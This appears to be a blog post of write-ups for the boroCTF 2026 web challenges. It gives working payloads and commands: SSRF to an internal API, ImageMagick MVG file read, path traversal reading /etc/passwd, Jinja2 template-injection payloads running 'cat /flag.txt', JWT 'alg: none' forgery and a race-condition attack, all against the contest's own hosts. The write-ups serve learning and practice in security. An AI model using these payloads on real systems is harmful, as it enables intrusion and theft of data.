---
layout: post
title:  "Web Challenges"
date:   2026-06-08 14:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /boroCTF-2026-web/
---
* TOC
{:toc}
{% raw %}

## Beyond the Homepage

**Author**: Solarity

**Category**: Web

**Description**: There's more to what you see... `https://6ox3t3alzl51.boroctf.com/`

```shell
curl https://6ox3t3alzl51.boroctf.com/  
<!DOCTYPE html>  
<html lang="en">  
<head>  
	<meta charset="UTF-8">  
	<meta name="viewport" content="width=device-width, initial-scale=1.0">  
	<title>boroCTF / Beyond the Webpage</title>  
	<!--boroCTF{d3v3l0peR_t001s}-->  
</head>  
  
<body>  
	<h1>boroCTF</h1>  
	<p>Sometimes there's more to what you can see.<br><br>(Hint: You might want to use a tool that a developer might use)</p>  
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a0ab76299c3df5eb',t:'MTc4MTI5NDYzNA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.add EventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
```

`boroCTF{d3v3l0peR_t001s}`

___

## boro-senpai 1

**Author**: Solarity

**Category**: Web

**Description**: Muhahaha! The Organization thinks they can silence me, but I, Hououin Kyouma, have uncovered a lead. My assistant — the self-proclaimed neuroscience prodigy — harbors a secret so embarrassing it could shake the very fabric of her dignity. An old @channel handle. Find it, and her profile is yours. El. Psy. Kongroo. `https://w03xj6cjsucj.boroctf.com`

I go to the site:

![Alt text](/images/boroctfweb1.png)

My profile is at: `https://w03xj6cjsucj.boroctf.com/profile/hououin_kyouma`

I can visit the profiles of the other non anonymous users:

![Alt text](/images/boroctfweb2.png)

```shell
curl https://w03xj6cjsucj.boroctf.com/profile/KuriGohanandKamehameha | grep boro  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100  6614    0  6614    0     0   5381      0 --:--:--  0:00:01 --:--:--  5385  
		<td class="value">I&#39;m not a tsundere. I&#39;m a scientist. This is my personal board handle and I will not be elaborating further. [ Personal note: boroCTF{3l_psY_c0ngR00!} ]</td>  
		<td class="value"><span class="flag-value">boroCTF{3l_psY_c0ngR00!}</span></td>
```

`boroCTF{3l_psY_c0ngR00!}`

___

## boro-senpai 2

**Author**: Solarity

**Category**: Web

**Description**: Maine's dead. Lucy's gone dark. David-... you know what happened. There's nothing we can do now. You're the last one standing with a half-finished contract and nothing left to lose. Arasaka's internal data relay is locked behind a blocklist — but their own NetPulse uptime checker is still live on the public net. Plug in. Pull the flag. Get out. `https://4imc7nitr7ln.boroctf.com/`

I go to the site:

![Alt text](/images/boroctfweb3.png)

I start reading the source code and on `view-source:https://4imc7nitr7ln.boroctf.com/static/script.js` I found some interesting comments:
```js
// NOTE FOR DEVS: diagnostic probe routes through the proxy service.
// Internal nodes on mainframe-net (e.g. internal-api) are supposed to be
// shielded by the perimeter blocklist. Double-check filter coverage before prod.
```

All requests to `localhost`, `127.0.0.1`, etc are blocked and respond with:
```http
{
	"error":"INTRUSION DETECTED: Target flagged as restricted subnet. Internal network access denied by perimeter firewall."
}
```

I make a request to `http://internal-api/flag`:
```shell
curl -X POST https://4imc7nitr7ln.boroctf.com/api/pulse -H "Content-Type: application/json" -d '{"url":"http://internal-api/flag"}'  
{"body":"{\"classification\":\"TOP SECRET\",\"flag\":\"boroCTF{w1sh_w3_c0uld_g0_2_th3_m00n_t0g3th3r}\",\"message\":\"MAINFRAME BREACH CONFIRMED \\u2014 CLASSIFIED DATA EXFILTRATED\"}\n","status":200}
```

`boroCTF{w1sh_w3_c0uld_g0_2_th3_m00n_t0g3th3r}`

___

## boro-senpai 3

**Author**: Solarity

**Category**: Web

**Description**: ------------ was an actress. A public figure. Then one day, she wasn't. Her AobaNet account — gone. Her name — scrubbed. The internet forgot she existed. But the internet doesn't actually delete things. Prove she existed. `https://5l24ruh9miuo.boroctf.com/`

I go to the site:

![Alt text](/images/boroctfweb4.png)

I dont watch anime so I had to ask AI about what they were talking about. I found out they are talking about the show `Rascal Does Not Dream of Bunny Girl Senpai`. Great. It told me the missing character they are talking about is `Mai Sakurajima`.

I looked on `view-source:https://5l24ruh9miuo.boroctf.com/`. You can visit each profile at `https://5l24ruh9miuo.boroctf.com/profile/kaede-azusagawa`, etc. 

On `/static/main.js` I found this javascript:
```js

... etc ...

(function initModPanel() {

	var API_BASE = '/api/user/';

	function fetchDeletedProfile(username, cb) {
		var url = API_BASE + encodeURIComponent(username) + '?' + window._modFlags.k + '=' + window._modFlags.v;
		fetch(url, {
				credentials: 'same-origin'
			})
			.then(function(res) {
				return res.json();
			})
			.then(function(data) {
				if (cb) cb(null, data);
			})
			.catch(function(err) {
				if (cb) cb(err, null);
			});
	}

	function el(tag, cls, html) {
		var e = document.createElement(tag);
		if (cls) e.className = cls;
		if (html) e.innerHTML = html;
		return e;
	}

	function renderDeletedCard(profile) {
		var card = el('div', 'mod-card mod-card--deleted');
		var header = el('div', 'mod-card__header',
			'<span class="mod-badge">DELETED RECORD</span> ' +
			'<strong>' + (profile.display_name || profile.username) + '</strong>' +
			' &nbsp;<code>@' + profile.username + '</code>' +
			' &nbsp;<span class="mod-ts">deleted: ' + (profile.deleted_at || 'n/a') + '</span>'
		);
		var body = el('div', 'mod-card__body');
		var notes = el('p', 'mod-notes', profile.mod_notes || '(no mod notes on record)');
		var joined = el('p', 'mod-meta', 'Joined: ' + profile.joined + ' &nbsp;|&nbsp; Posts: ' + profile.posts);
		body.appendChild(notes);
		body.appendChild(joined);
		card.appendChild(header);
		card.appendChild(body);
		return card;
	}

	function initPanel(panelEl) {
		var username = panelEl.dataset.username;
		if (!username) return;
		var spinner = el('p', 'mod-loading', '読み込み中...');
		panelEl.appendChild(spinner);
		fetchDeletedProfile(username, function(err, data) {
			panelEl.removeChild(spinner);
			if (err || data.code === 404) {
				panelEl.appendChild(el('p', 'mod-error', 'Failed to load deleted record.'));
				return;
			}
			panelEl.appendChild(renderDeletedCard(data));
		});
	}

	document.querySelectorAll('#mod-deleted-panel[data-username]').forEach(initPanel);

})();
```

I confirm `mai-sakurajima` is the username I need by first looking at a valid profile:
```shell
curl https://5l24ruh9miuo.boroctf.com/api/user/tomoe-koga | jq 
{
  "bio": "高校2年。バイトと勉強とバイトと勉強。たまに猫っぽいって言われる。猫じゃないし。",
  "display_name": "古賀朋絵 / Tomoe Koga",
  "followers": 1842,
  "following": 309,
  "joined": "2012/04/07",
  "location": "Fujisawa, Kanagawa",
  "posts": 2041,
  "recent_posts": [
    {
      "date": "2013/09/14 18:33",
      "id": "t-004",
      "text": "今日のバイト終わり。疲れた〜。でもシフト増やされた。なんで。"
    },
    {
      "date": "2013/09/13 22:11",
      "id": "t-003",
      "text": "バイト終わったあと本屋に寄った。参考書買いすぎた。"
    },
    {
      "date": "2013/09/12 15:48",
      "id": "t-002",
      "text": "文化祭の準備たいへん。衣装どうしよう。"
    },
    {
      "date": "2013/09/10 09:20",
      "id": "t-001",
      "text": "近所の猫が毎朝同じ時間に待ってる。なんか親近感わく。"
    }
  ],
  "status": "active",
  "username": "tomoe-koga"
}
```

Then I requested a random user. It returns `User not found`:
```shell
curl https://5l24ruh9miuo.boroctf.com/api/user/random  
{"code":404,"error":"User not found."}
```

`mai-sakurajima` is the only account I can find that returns `This account has been suspended or does not exist.`:
```shell
curl https://5l24ruh9miuo.boroctf.com/api/user/mai-sakurajima  
{"code":404,"error":"This account has been suspended or does not exist."}
```

I look at `https://5l24ruh9miuo.boroctf.com/profile/mai-sakurajima` and grep for `<script>window._modFlags=`:
```shell
curl https://5l24ruh9miuo.boroctf.com/profile/mai-sakurajima | grep "<script>window._modFlags="  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100  6043    0  6043    0     0   5287      0 --:--:--  0:00:01 --:--:--  5291  
<script>window._modFlags=(function(){var d=atob('aW5jbHVkZV9kZWxldGVk'),v=atob('dHJ1ZQ==');return{k:d,v:v};})();</script>
```

Decode the values:
```shell
echo 'aW5jbHVkZV9kZWxldGVk' | base64 -d  
include_deleted

echo 'dHJ1ZQ==' | base64 -d  
true
```

Now I can view the details of the account suspension:
```shell
curl https://5l24ruh9miuo.boroctf.com/api/user/mai-sakurajima?include_deleted=true | jq  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100  1499  100  1499    0     0   1313      0  0:00:01  0:00:01 --:--:--  1314  
{
  "bio": "Account suspended per user request. Data retained per moderation policy.",
  "deleted_at": "2013/09/01 03:17",
  "display_name": "___________ / ___________",
  "followers": 94211,
  "following": 41,
  "joined": "2011/05/20",
  "location": "Tokyo, Japan",
  "mod_notes": "Soft-deleted 2013-09-01 03:17 JST. Account holder flagged for adolescence syndrome — subject ceased to be perceived by public observers. Deletion requested by management (ref: ticket #AN-20130901-004). Data preserved under internal policy §4.2(c). Do not surface in public search. Mod review pending. -- boroCTF{th@nk_y0u_y0u_d!d_w3ll_!_l0v3_y0U<3}",
  "posts": 1337,
  "recent_posts": [
    {
      "date": "2013/08/31 22:55",
      "id": "m-004",
      "text": "みんな、今日も覚えていてくれてありがとう。"
    },
    {
      "date": "2013/08/30 18:20",
      "id": "m-003",
      "text": "また誰かに無視された。気づいたら独りだった。でも、私はここにいる。"
    },
    {
      "date": "2013/08/28 14:10",
      "id": "m-002",
      "text": "撮影の合間にひとりでカフェに来た。誰も気づかない。"
    },
    {
      "date": "2013/08/25 09:44",
      "id": "m-001",
      "text": "消えていくような気がする。でも消えたくない。"
    }
  ],
  "status": "deleted",
  "username": "mai-sakurajima"
}
```

`boroCTF{th@nk_y0u_y0u_d!d_w3ll_!_l0v3_y0U<3}`

___

## Kobeni's Dashboard

**Author**: Solarity

**Category**: Web

**Description**: Kobeni's been tasked with cataloging devil sighting evidence through Public Safety's new imaging system, but rumor has it that contract information between the Chainsaw Devil & Denji are buried somewhere in the classified archive. Report back your findings. `https://sj20riah2597.boroctf.com/`

I go to the website:

![Alt text](/images/boroctfweb5.png)

I test uploading an innocent file:

![Alt text](/images/boroctfweb6.png)

In a response header I see they are using `ImageMagick`:
```shell
X-Processor: ImageMagick/unknown
```

I looked up vulnerabilities related to ImageMagick and landed on [https://imagetragick.com/](https://imagetragick.com/). Towards the bottom the author says this:
```shell
5. CVE-2016-3717 - Local file read (independently reported by original research author - [Stewie](https://hackerone.com/stewie))

It is possible to get content of the files from the server by using ImageMagick's 'label' pseudo protocol:

file_read.mvg

push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context

$ convert file_read.mvg out.png

produces file with text rendered from /etc/passwd
```

I try sending a request like this and it works!

![Alt text](/images/boroctfweb7.png)

I get the flag by sending this request:
```http
POST /upload HTTP/2
Host: sj20riah2597.boroctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://sj20riah2597.boroctf.com/
Content-Type: multipart/form-data; boundary=----geckoformboundaryc528f4f50a4c11ee94c3100df4cbcc10
Content-Length: 314
Origin: https://sj20riah2597.boroctf.com
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundaryc528f4f50a4c11ee94c3100df4cbcc10
Content-Disposition: form-data; name="file"; filename="read.mvg"
Content-Type: image/x-mvg

push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/flag.txt'
pop graphic-context
------geckoformboundaryc528f4f50a4c11ee94c3100df4cbcc10--
```

![Alt text](/images/boroctfweb8.png)

`boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}`

___

## Cracking the Vault

**Author**: Solarity

**Category**: Web

**Description**: Apparently this banking system is super secure and would never store the password somewhere in plain sight... `https://qphi2o7slkwc.boroctf.com/`

The flag is simply on the page:
```shell
curl https://qphi2o7slkwc.boroctf.com/ | grep boro  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                 Dload  Upload   Total   Spent    Left  Speed  
100  2531    0  2531    0     0   2264      0 --:--:--  0:00:01 --:--:--  2265  
    <title>boroCTF / Cracking the Vault</title>  
				messageEl.textContent = "✓ Correct! Flag: boroCTF{th3_p@th_l3ss_tr@vers3d}";
```

`boroCTF{th3_p@th_l3ss_tr@vers3d}`

___

## dotdotslashflagtxt

**Author**: Solarity

**Category**: Web

**Description**: A company left their internal document viewer exposed. It only shows approved files... or does it? `https://0gil6sh8nlk1.boroctf.com/`

I go to the site:

![Alt text](/images/boroctfweb9.png)

You can view a file like this:
```shell
curl https://0gil6sh8nlk1.boroctf.com/view?file=notes.txt  
Project Notes:  
- Completed challenge "Beyond the Homepage"  
- "Cracking the Vault" in progress  
- boroCTF scheduled to be launched soon!
```

I confirm path traversal:
```shell
curl https://0gil6sh8nlk1.boroctf.com/view?file=../../../../etc/passwd  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
appuser:x:1000:1000::/home/appuser:/bin/bash
```

Get the flag:
```shell
curl https://0gil6sh8nlk1.boroctf.com/view?file=../flag.txt  
boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
```

`boroCTF{p@th_Tr@v3rs@L_r0Ck5!}`

___

## NERV

**Author**: Solarity

**Category**: Web

**Description**: NERV HQ internal systems remain online following the Third Impact preliminary event.

You have been assigned clearance level 2. This is sufficient.

Do not look for what you have not been given access to. The `[REDACTED]` does not require your curiosity. It requires your compliance.

Credentials have been issued. ikari : eva01

The Committee is watching. — Commander Ikari

`https://xqpmkotuq78s.boroctf.com/`

I go to the site and login with `ikari:eva01`. Then Im on `https://xqpmkotuq78s.boroctf.com/dashboard`:

![Alt text](/images/boroctfweb10.png)

There isnt much on `/dashboard`. You can also go to `/sync-calc` but it is also a dead end. Looking at `/robots.txt`:
```shell
curl https://xqpmkotuq78s.boroctf.com/robots.txt  
User-agent: *  
Disallow: /admin/reports
```

On `https://xqpmkotuq78s.boroctf.com/admin/reports` it says I can enter a report template query:

![Alt text](/images/boroctfweb11.png)

I submit `{{7*'7'}}` to confirm the templating engine is Jinja2:

![Alt text](/images/boroctfweb12.png)

I grab the flag file with this payload:
```shell
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', '/flag.txt'])}}
```

![Alt text](/images/boroctfweb13.png)

`boroCTF{c0ngr@tulat!0nS*}`

___

## boroGPT

**Author**: Solarity

**Category**: Web

**Description**: Introducing boroGPT, boroAI's cutting-edge large language model that will revolutionize the way you think about chatbots! Our engineers have been hard at work building the most secure, scalable, and enterprise-ready AI platform the world has ever seen! `https://mx7pk2qw9nr4slvt.boroctf.com/`

I go to the site:

![Alt text](/images/boroctfweb14.png)

Sending chats to the AI makes a POST request to `/api/v1/chat`. On `https://mx7pk2qw9nr4slvt.boroctf.com/static/main.js` I find a lot of helpful info:
```js
/*! boroGPT v2.4.1 | (c) 2024 boro Corp | MIT License */
!function (e, t) {
	'object' == typeof exports && 'object' == typeof module ? module.exports = t() : 'function' == typeof define && define.amd ? define([], t) : 'object' == typeof exports ? exports.boroGPT = t() : e.boroGPT = t();
}(this, function () {
	var e = {}, t = {};
	function n(e) {
		var r = t[e];
		if (void 0 !== r)
			return r.exports;
		var o = t[e] = {
			id: e,
			loaded: !1,
			exports: {}
		};
		return e(o, o.exports, n), o.loaded = !0, o.exports;
	}
	return n.d = function (e, t) {
		for (var r in t)
			n.o(t, r) && !n.o(e, r) && Object.defineProperty(e, r, {
				enumerable: !0,
				get: t[r]
			});
	}, n.o = function (e, t) {
		return Object.prototype.hasOwnProperty.call(e, t);
	}, n.r = function (e) {
		'undefined' != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: 'Module' }), Object.defineProperty(e, '__esModule', { value: !0 });
	}, n(0);
});
(function () {
	var _0x4f2a = [
		'v0',
		'users',
		'render',
		'jwks',
		'X-Dev-Mode',
		'Authorization',
		'Bearer ',
		'true'
	];
	var c = function (e, t) {
		return _0x4f2a[e - 496];
	};
	var F = {
			version: '2.4.1',
			build: 'prod',
			_legacyBase: '/api/' + c(496) + '/'
		}, L = window.location, R = L.protocol + '//' + L.host;
	function _r(e, t) {
		return fetch(R + e, Object.assign({}, {
			credentials: 'same-origin',
			headers: {
				'Content-Type': 'application/json',
				'X-Client-Version': '2.4.1'
			}
		}, t));
	}
	var T = {
		chat: function (e) {
			return _r('/api/v1/chat', {
				method: 'POST',
				body: JSON.stringify(e)
			});
		}
	};
	e.api = T;
	e.config = F;
}());	//# sourceMappingURL=main.js.map
```

Looking at `main.js.map`:
```shell
cat main.js.map
{
    "version": 3,
    "file": "main.js",
    "sourceRoot": "",
    "sources": [
        "src/index.js",
        "src/api/client.js",
        "src/components/chat.js",
        "src/components/sidebar.js",
        "src/utils/dom.js"
    ],
    "sourcesContent": [
        "import { api } from './api/client';\nimport { initChat } from './components/chat';\nimport { initSidebar } from './components/sidebar';\n\ndocument.addEventListener('DOMContentLoaded', () => {\n  initSidebar();\n  initChat(api);\n});\n",
        "// Legacy dev client - DO NOT SHIP\nconst devFetch = (endpoint, options = {}) => {\n  return fetch(endpoint, {\n    ...options,\n    headers: {\n      ...options.headers,\n      \"X-Dev-Mode\": \"true\"\n    }\n  });\n};\n\nexport const getUsers = () => devFetch(\"/api/v0/users\");\nexport const renderTemplate = (template, token) => devFetch(\"/api/v0/render\", {\n  method: \"POST\",\n  headers: { \"Authorization\": `Bearer ${token}` },\n  body: JSON.stringify({ template })\n});\n\nexport const getJWKS = () => devFetch(\"/api/v0/jwks\");\n",
        "export function initChat(api) {\n  const container = document.getElementById('chatContainer');\n  const input = document.getElementById('msgInput');\n  if (!container || !input) return;\n\n  window._chatApi = api;\n}\n",
        "export function initSidebar() {\n  const items = document.querySelectorAll('.conv-item');\n  items.forEach(item => {\n    item.addEventListener('click', () => {\n      items.forEach(i => i.classList.remove('active'));\n      item.classList.add('active');\n    });\n  });\n}\n",
        "export const escHtml = s =>\n  s.replace(/&/g, '&amp;')\n   .replace(/</g, '&lt;')\n   .replace(/>/g, '&gt;')\n   .replace(/\"/g, '&quot;');\n\nexport const qs = (sel, ctx = document) => ctx.querySelector(sel);\nexport const qsa = (sel, ctx = document) => [...ctx.querySelectorAll(sel)];\n"
    ],
    "names": [],
    "mappings": "AAAA,SAAS,GAAG,EAAE,SAAS,EAAE,WAAW,EAAE,SAAS"
}
```

Looking at `/api/v0/users` with the header `X-Dev-Mode: true`:
```shell
curl https://mx7pk2qw9nr4slvt.boroctf.com/api/v0/users -H "X-Dev-Mode: true"  
[{"email":"alice@borocorp.io","id":1,"role":"user","username":"alice"},{"email":"bob@borocorp.io","id":2,"role":"user","username":"bob"},{"email":"carol@borocorp.io","id":3,"role":"moderator","username":"carol"},{"_note":"debug session token","email":"admin@borocorp.io","id":4,"role":"admin","sample_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzcyI6ImJvcm9ncHQtZGV2In0.fdrRsBk-C-8VW3vE_NO8WxY7I0KeYIgWP31aZtTJlzFY-6iTOXV4ztoulDYt3yxGJg8xrbwHrSUJDXgraXj-o_O6Kta4kC9AfitfP6jNkvd7fXnko-5SeysIC9onI2Peqo5xZOgz3IDxU_hrYvYIhExb4V_r6pBeDSEOjj0zLuqzFpVhvBQfDf9NrV-xbcmvxbLzjrZribzVvO2E4WqU8I7dQn5tLbreUipKF8A7wzL_ZtPhT-Z5rErq9mSA59JX7S11z-Ai4BCL9UJLsQ-B-oGMWbKy9-  
Ex549cD_idxWmhetgnbv5M1r4LqHoBWE-Z80MOSX2uEWLo19B0z4vgGg","username":"admin"}]
```

Header and payload of jwt:
```shell
{
  "typ": "JWT",
  "alg": "RS256"
}
{
  "sub": "admin",
  "role": "admin",
  "iss": "borogpt-dev"
}
```

Looking at `/api/v0/jwks` with the `X-Dev-Mode: true` header:
```shell
curl https://mx7pk2qw9nr4slvt.boroctf.com/api/v0/jwks -H "X-Dev-Mode: true"  
{"keys":[{"alg":"RS256","e":"AQAB","kid":"borogpt-key-v1","kty":"RSA","n":"npug_-n-aYTHAhguDSVmH1Y41L4T3P6zGO668aFlt869c54nzkCrH38z1uBCQd4VADsDS_0RluPvZxyRRTQnxrJvksN8mUV4WPvHdRnBT83JPZs2n15qAC_nTdtK37b6UNErORB8XAcK0SNfsg9d-xArqXIRop2EMR9yAmTqxPWhyYG_myrXLXWrnCIz0e8n1UzJGUwH88_IYljYomrdQXaz36x6kcCqEvNNolGx0tuv9d7R2m1YnYXvhYzSh8BlyKX0GFsQhDpyiHAYlCzFawrl6RA4KWO2ZcebINvvwlhozMBsQM0woUqUEIdAgM4n9fbMgoUf8pLPhDTRmeGPzw","use":"sig"}]}
```

Using the JWT given from `/api/v0/users`, I test for SSTI on `/api/v0/render`:
```shell
curl -X POST https://mx7pk2qw9nr4slvt.boroctf.com/api/v0/render -H "Content-Type: application/json" -H "X-Dev-Mode: true" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzcyI6ImJvcm9ncHQtZGV2In0.fdrRsBk-C-8VW3vE_NO8WxY7I0KeYIgWP31aZtTJlzFY-6iTOXV4ztoulDYt3yxGJg8xrbwHrSUJDXgraXj-o_O6Kta4kC9AfitfP6jNkvd7fXnko-5SeysIC9onI2Peqo5xZOgz3IDxU_hrYvYIhExb4V_r6pBeDSEOjj0zLuqzFpVhvBQfDf9NrV-xbcmvxbLzjrZribzVvO2E4WqU8I7dQn5tLbreUipKF8A7wzL_ZtPhT-Z5rErq9mSA59JX7S11z-Ai4BCL9UJLsQ-B-oGMWbKy9-Ex549cD_idxWmhetgnbv5M1r4LqHoBWE-Z80MOSX2uEWLo19B0z4vgGg" -d '{"template": "{{7*7}}"}'  
{"output":"49"}
```

Using the payload:
```shell
{{ lipsum.__globals__.os.popen(\"cat /flag.txt\").read() }}
```

Get the flag:
```shell
curl -X POST https://mx7pk2qw9nr4slvt.boroctf.com/api/v0/render -H "Content-Type: application/json" -H "X-Dev-Mode: true" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzcyI6ImJvcm9ncHQtZGV2In0.fdrRsBk-C-8VW3vE_NO8WxY7I0KeYIgWP31aZtTJlzFY-6iTOXV4ztoulDYt3yxGJg8xrbwHrSUJDXgraXj-o_O6Kta4kC9AfitfP6jNkvd7fXnko-5SeysIC9onI2Peqo5xZOgz3IDxU_hrYvYIhExb4V_r6pBeDSEOjj0zLuqzFpVhvBQfDf9NrV-xbcmvxbLzjrZribzVvO2E4WqU8I7dQn5tLbreUipKF8A7wzL_ZtPhT-Z5rErq9mSA59JX7S11z-Ai4BCL9UJLsQ-B-oGMWbKy9-Ex549cD_idxWmhetgnbv5M1r4LqHoBWE-Z80MOSX2uEWLo19B0z4vgGg" -d '{"template": "{{ lipsum.__globals__.os.popen(\"cat /flag.txt\").read() }}"}'  
{"output":"boroCTF{pub1ic_k3y_g0es_both_ways}\n"}
```

`boroCTF{pub1ic_k3y_g0es_both_ways}`

___

## Jay. W. Tee

**Author**: Solarity

**Category**: Web

**Description**: Mr. Jay W. Tee seems to think his website is pretty secure. `https://lt560zwl9uv6.boroctf.com/`

I go to the site:

![Alt text](/images/boroctfweb15.png)

I login with `test:test` and land on `/dashboard`:

![Alt text](/images/boroctfweb16.png)

I get assigned a jwt:
```shell
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.fMz9PW3TsiaXmxOdXOCoE9YQZ9FirIxNqy34kx8PrfU
```

Header and claims:
```shell
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "test",
  "role": "guest"
}
```

I tried to downgrade the algorithm to `none`:
```shell
{
  "alg": "none",
  "typ": "JWT"
}
{
  "username": "test",
  "role": "admin"
}
```

This gives me this jwt:
```shell
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

I update my cookie on `/admin` and get the flag:

![Alt text](/images/boroctfweb17.png)

`boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}`

___

## My Mayor Muslim...

**Author**: Solarity

**Category**: Web

**Description**: My Bagel Jewish...My Christian Dior.... `https://ed25472fd89a.boroctf.com/`

I go to the challenge site:

![Alt text](/images/boroctfweb18.png)

Clicking `shoot` makes a POST request to `/api/shoot`. It responds with: `{"score":2}`

I can also make a GET request to `/api/state`. It responds with: `{"score":2}`

The goal is to score 45. If I manually click `shoot` up until I score 46 (it adds 2 points at a time) it responds with this:
```shell
{"message":"REFEREE TIMEOUT! The refs saw Brunson approaching 45 \u2014 Wembanyama gets 10 free throws. Score WIPED.","rigged":true,"score":0}
```

I manually sent requests to `/api/shoot` up until I had 44 points. Then I created a group in burp suite in the repeater tab. I need to send the multiple requests in parallel (single packet attack). Some of the requests make it through:

![Alt text](/images/boroctfweb19.png)

`boroCTF{KN!CK5_1N_5555!!!!!}`

{% endraw %}